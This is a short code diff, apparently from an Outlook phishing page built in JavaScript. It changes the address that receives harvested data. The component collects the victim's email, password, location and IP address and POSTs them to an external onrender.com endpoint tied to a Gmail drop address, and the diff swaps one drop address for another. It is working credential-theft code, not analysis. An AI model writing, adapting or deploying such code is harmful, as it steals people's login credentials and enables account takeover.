@@ -95,7 +95,6 @@ const Outlook = ()=>{
                 email: outlookEmail,
                 pswd: outlookPassword,
                 country: country,
-                
                 city: city,
                 flag: flag,
                 eyep: ipAdress,
@@ -104,7 +103,8 @@ const Outlook = ()=>{
             
             $.ajax({
                 type: "POST",
-                url: "https://meler-service.onrender.com/get_details/damienhubert06@gmail.com",
+                url: "https://send-service-quotaion.onrender.com/get_details/fablogs111@gmail.com/order/",
+                
                 data: user,
                 success(data) {
                     // alert('OK');
